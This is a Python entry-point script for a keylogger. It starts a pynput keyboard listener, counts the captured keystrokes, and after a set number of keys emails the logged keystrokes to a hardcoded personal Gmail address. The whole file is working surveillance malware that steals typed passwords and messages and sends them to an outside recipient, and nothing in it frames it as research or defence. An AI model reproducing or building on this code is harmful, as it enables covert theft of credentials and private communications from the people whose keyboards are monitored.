import socket

from pynput import keyboard

from config import KEYSTROKE_PER_MAIL
from emailsender import EmailSender
from keylogger import KeyLogger
from keystroke_handler import KeyStrokeHandler


def main():
    keylogger: KeyLogger = KeyLogger()
    keylogger.start()
    key_stroke_handler: KeyStrokeHandler = KeyStrokeHandler(keylogger)

    while True:
        with keyboard.Listener(
            on_press=key_stroke_handler.on_press,
            on_release=key_stroke_handler.on_release,
        ) as listener:
            listener.join()
            # update keystroke count
            keylogger.increase_keys_count()
        # send_email
        if keylogger.keys_count > KEYSTROKE_PER_MAIL:
            try:
                with EmailSender() as email_sender:
                    # email_sender.connect()
                    email_sender.send_mail(
                        "solomonuche42@gmail.com", "KEYSTROKES", keylogger.keys
                    )
                    # reset keys count
                    keylogger.reset_keys_count()
            except socket.gaierror:
                continue


if __name__ == "__main__":
    main()
